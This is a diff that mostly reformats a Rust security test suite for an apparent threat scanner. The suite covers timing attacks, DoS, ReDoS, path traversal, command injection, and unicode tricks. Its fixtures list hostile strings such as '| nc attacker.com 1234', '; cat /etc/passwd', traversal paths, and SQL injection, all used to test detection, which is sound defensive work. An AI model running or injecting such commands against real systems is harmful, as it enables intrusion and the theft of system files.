@@ -1,14 +1,13 @@
 //! Security-Specific Test Suite
 //! Tests for timing attacks, resource exhaustion, and other security concerns
 
-use kindly_guard_server::{SecurityScanner, ScannerConfig, McpServer, Config};
+use kindly_guard_server::{Config, McpServer, ScannerConfig, SecurityScanner};
+use proptest::prelude::*;
 use serde_json::{json, Value};
 use std::sync::Arc;
 use std::time::{Duration, Instant};
-use proptest::prelude::*;
 
 mod helpers;
-use helpers::*;
 
 /// Test constant-time operations
 #[test]
@@ -16,45 +15,53 @@ fn test_constant_time_token_comparison() {
     // Test that token comparison takes similar time regardless of match position
     let valid_token = "Bearer valid-token-12345678901234567890";
     let test_cases = vec![
-        ("Bearer invalid-token-12345678901234567890", "completely different"),
-        ("Bearer valid-token-12345678901234567891", "differs at last char"),
+        (
+            "Bearer invalid-token-12345678901234567890",
+            "completely different",
+        ),
+        (
+            "Bearer valid-token-12345678901234567891",
+            "differs at last char",
+        ),
         ("Bearer valid-token-12345678901234567890", "exact match"),
-        ("Bearerinvalid-token-12345678901234567890", "differs at first char"),
+        (
+            "Bearerinvalid-token-12345678901234567890",
+            "differs at first char",
+        ),
         ("Bearer v", "short token"),
         ("", "empty token"),
     ];
-    
+
     let mut timings = Vec::new();
-    
+
     for (test_token, description) in test_cases {
         let start = Instant::now();
-        
+
         // Simulate constant-time comparison
         let mut diff = 0u8;
         let valid_bytes = valid_token.as_bytes();
         let test_bytes = test_token.as_bytes();
         let len = std::cmp::max(valid_bytes.len(), test_bytes.len());
-        
+
         for i in 0..len {
             let v = valid_bytes.get(i).unwrap_or(&0);
             let t = test_bytes.get(i).unwrap_or(&0);
             diff |= v ^ t;
         }
-        
+
         let _is_equal = diff == 0;
         let elapsed = start.elapsed();
-        
+
         timings.push((description, elapsed));
     }
-    
+
     // Check that timings are similar (within 50% of each other)
     let max_time = timings.iter().map(|(_, t)| t.as_nanos()).max().unwrap();
     let min_time = timings.iter().map(|(_, t)| t.as_nanos()).min().unwrap();
-    
+
     assert!(
         max_time <= min_time * 3 / 2,
-        "Timing attack possible: max={:?}ns, min={:?}ns",
-        max_time, min_time
+        "Timing attack possible: max={max_time:?}ns, min={min_time:?}ns"
     );
 }
 
@@ -62,10 +69,10 @@ fn test_constant_time_token_comparison() {
 async fn test_dos_protection_large_payload() {
     let config = Config::default();
     let server = Arc::new(McpServer::new(config).unwrap());
-    
+
     // Create very large payload (10MB)
     let large_text = "a".repeat(10 * 1024 * 1024);
-    
+
     let request = json!({
         "jsonrpc": "2.0",
         "method": "tools/call",
@@ -77,15 +84,15 @@ async fn test_dos_protection_large_payload() {
         },
         "id": 1
     });
-    
+
     let start = Instant::now();
     let response = server.handle_message(&request.to_string()).await;
     let elapsed = start.elapsed();
-    
+
     // Should either reject or complete quickly
     assert!(
         response.is_some() && elapsed < Duration::from_secs(5),
-        "Large payload DoS: took {:?}", elapsed
+        "Large payload DoS: took {elapsed:?}"
     );
 }
 
@@ -93,13 +100,13 @@ async fn test_dos_protection_large_payload() {
 async fn test_dos_protection_deeply_nested_json() {
     let config = Config::default();
     let server = Arc::new(McpServer::new(config).unwrap());
-    
+
     // Create deeply nested JSON (1000 levels)
     let mut deeply_nested = json!("value");
     for _ in 0..1000 {
         deeply_nested = json!({"nested": deeply_nested});
     }
-    
+
     let request = json!({
         "jsonrpc": "2.0",
         "method": "tools/call",
@@ -111,13 +118,13 @@ async fn test_dos_protection_deeply_nested_json() {
         },
         "id": 1
     });
-    
+
     let response = server.handle_message(&request.to_string()).await;
-    
+
     // Should handle gracefully (either error or succeed)
     assert!(response.is_some());
     let response_json: Value = serde_json::from_str(&response.unwrap()).unwrap();
-    
+
     // Should either return error or complete scan
     assert!(
         response_json["error"].is_object() || response_json["result"].is_object(),
@@ -135,26 +142,25 @@ fn test_regex_dos_protection() {
         max_scan_depth: 10,
         enable_event_buffer: false,
     };
-    
+
     let scanner = SecurityScanner::new(config).unwrap();
-    
+
     // Test patterns that could cause catastrophic backtracking
     let evil_patterns = vec![
-        format!("{}X", "a".repeat(100)),     // Long string with no match
-        "(a+)+".repeat(10),                  // Nested quantifiers
-        "(a*)*b".to_string(),                // Catastrophic pattern
-        "(x+x+)+y".to_string(),              // Another catastrophic pattern
+        format!("{}X", "a".repeat(100)), // Long string with no match
+        "(a+)+".repeat(10),              // Nested quantifiers
+        "(a*)*b".to_string(),            // Catastrophic pattern
+        "(x+x+)+y".to_string(),          // Another catastrophic pattern
     ];
-    
+
     for pattern in evil_patterns {
         let start = Instant::now();
         let _ = scanner.scan_text(&pattern);
         let elapsed = start.elapsed();
-        
+
         assert!(
             elapsed < Duration::from_millis(100),
-            "ReDoS protection failed for pattern: {}, took {:?}",
-            pattern, elapsed
+            "ReDoS protection failed for pattern: {pattern}, took {elapsed:?}"
         );
     }
 }
@@ -163,10 +169,10 @@ fn test_regex_dos_protection() {
 async fn test_memory_exhaustion_protection() {
     let config = Config::default();
     let server = Arc::new(McpServer::new(config).unwrap());
-    
+
     // Try to exhaust memory with many concurrent requests
     let mut handles = vec![];
-    
+
     for i in 0..1000 {
         let server = server.clone();
         let handle = tokio::spawn(async move {
@@ -181,15 +187,16 @@ async fn test_memory_exhaustion_protection() {
                 },
                 "id": i
             });
-            
+
             tokio::time::timeout(
                 Duration::from_secs(5),
-                server.handle_message(&request.to_string())
-            ).await
+                server.handle_message(&request.to_string()),
+            )
+            .await
         });
         handles.push(handle);
     }
-    
+
     // Should handle all requests without OOM
     let mut success_count = 0;
     for handle in handles {
@@ -197,7 +204,7 @@ async fn test_memory_exhaustion_protection() {
             success_count += 1;
         }
     }
-    
+
     // At least some should succeed
     assert!(success_count > 0, "Memory exhaustion protection failed");
 }
@@ -212,9 +219,9 @@ fn test_path_traversal_prevention() {
         max_scan_depth: 10,
         enable_event_buffer: false,
     };
-    
+
     let scanner = SecurityScanner::new(config).unwrap();
-    
+
     let traversal_attempts = vec![
         "../../../etc/passwd",
         "..\\..\\..\\windows\\system32",
@@ -225,13 +232,12 @@ fn test_path_traversal_prevention() {
         "/var/www/../../etc/passwd",
         "C:\\webapp\\..\\..\\..\\windows\\system32",
     ];
-    
+
     for attempt in traversal_attempts {
         let threats = scanner.scan_text(attempt).unwrap();
         assert!(
             !threats.is_empty(),
-            "Failed to detect path traversal in: {}",
-            attempt
+            "Failed to detect path traversal in: {attempt}"
         );
     }
 }
@@ -246,9 +252,9 @@ fn test_command_injection_prevention() {
         max_scan_depth: 10,
         enable_event_buffer: false,
     };
-    
+
     let scanner = SecurityScanner::new(config).unwrap();
-    
+
     let command_injections = vec![
         "; cat /etc/passwd",
         "| nc attacker.com 1234",
@@ -259,13 +265,12 @@ fn test_command_injection_prevention() {
         "; python -c 'import socket; socket.socket()'",
         "\n/bin/sh\n",
     ];
-    
+
     for injection in command_injections {
         let threats = scanner.scan_text(injection).unwrap();
         assert!(
             !threats.is_empty(),
-            "Failed to detect command injection in: {}",
-            injection
+            "Failed to detect command injection in: {injection}"
         );
     }
 }
@@ -274,22 +279,21 @@ fn test_command_injection_prevention() {
 async fn test_auth_token_entropy() {
     // Test that auth tokens have sufficient entropy
     let test_tokens = vec![
-        "password123",      // Weak
-        "12345678",        // Weak  
-        "aaaaaaaa",        // Weak
-        "test-token",      // Weak
+        "password123",                  // Weak
+        "12345678",                     // Weak
+        "aaaaaaaa",                     // Weak
+        "test-token",                   // Weak
         "xJ9#mK2$pL5@nQ8&rT1!vY4*wZ7^", // Strong
     ];
-    
+
     for token in test_tokens {
         let entropy = calculate_entropy(token);
-        
+
         // Tokens should have at least 40 bits of entropy
         if token.len() > 8 {
             assert!(
                 entropy > 40.0,
-                "Token '{}' has insufficient entropy: {:.2} bits",
-                token, entropy
+                "Token '{token}' has insufficient entropy: {entropy:.2} bits"
             );
         }
     }
@@ -297,20 +301,20 @@ async fn test_auth_token_entropy() {
 
 fn calculate_entropy(s: &str) -> f64 {
     use std::collections::HashMap;
-    
+
     let mut char_counts = HashMap::new();
     for c in s.chars() {
         *char_counts.entry(c).or_insert(0) += 1;
     }
-    
+
     let len = s.len() as f64;
     let mut entropy = 0.0;
-    
+
     for count in char_counts.values() {
-        let probability = *count as f64 / len;
+        let probability = f64::from(*count) / len;
         entropy -= probability * probability.log2();
     }
-    
+
     entropy * len
 }
 
@@ -324,22 +328,21 @@ fn test_unicode_normalization_attacks() {
         max_scan_depth: 10,
         enable_event_buffer: false,
     };
-    
+
     let scanner = SecurityScanner::new(config).unwrap();
-    
+
     // Test various unicode normalization attacks
     let normalization_attacks = vec![
         // Different representations of the same character
-        ("e\u{0301}", "é"),  // e + combining acute accent
+        ("e\u{0301}", "é"),               // e + combining acute accent
         ("\u{1FBF}", "\u{0020}\u{0313}"), // Greek psili
         ("\u{00C5}", "\u{0041}\u{030A}"), // Å vs A + ring
-        
         // Security-relevant normalizations
-        ("\u{2044}", "/"),   // Fraction slash vs normal slash
-        ("\u{FF0F}", "/"),   // Fullwidth solidus
-        ("\u{2215}", "/"),   // Division slash
+        ("\u{2044}", "/"), // Fraction slash vs normal slash
+        ("\u{FF0F}", "/"), // Fullwidth solidus
+        ("\u{2215}", "/"), // Division slash
     ];
-    
+
     for (attack, _normalized) in normalization_attacks {
         let threats = scanner.scan_text(attack);
         // Scanner should detect potential normalization issues
@@ -360,13 +363,13 @@ proptest! {
             max_scan_depth: 10,
             enable_event_buffer: false,
         };
-        
+
         if let Ok(scanner) = SecurityScanner::new(config) {
             // Should never panic, regardless of input
             let _ = scanner.scan_text(&input);
         }
     }
-    
+
     #[test]
     fn test_consistent_threat_detection(
         base in "[a-zA-Z0-9 ]{1,50}",
@@ -380,21 +383,21 @@ proptest! {
             max_scan_depth: 10,
             enable_event_buffer: false,
         };
-        
+
         if let Ok(scanner) = SecurityScanner::new(config) {
             // Add known threat pattern
             let input = match threat_type {
-                0 => format!("{}\u{200B}{}", base, base), // Zero-width space
-                1 => format!("{}' OR '1'='1", base),      // SQL injection
-                2 => format!("{}/../../../etc", base),    // Path traversal
-                3 => format!("{}; echo pwned", base),     // Command injection
-                _ => base.clone(),
+                0 => format!("{base}\u{200B}{base}"), // Zero-width space
+                1 => format!("{base}' OR '1'='1"),      // SQL injection
+                2 => format!("{base}/../../../etc"),    // Path traversal
+                3 => format!("{base}; echo pwned"),     // Command injection
+                _ => base,
             };
-            
+
             // Run multiple times - should get same result
             let result1 = scanner.scan_text(&input);
             let result2 = scanner.scan_text(&input);
-            
+
             match (result1, result2) {
                 (Ok(threats1), Ok(threats2)) => {
                     prop_assert_eq!(threats1.len(), threats2.len());
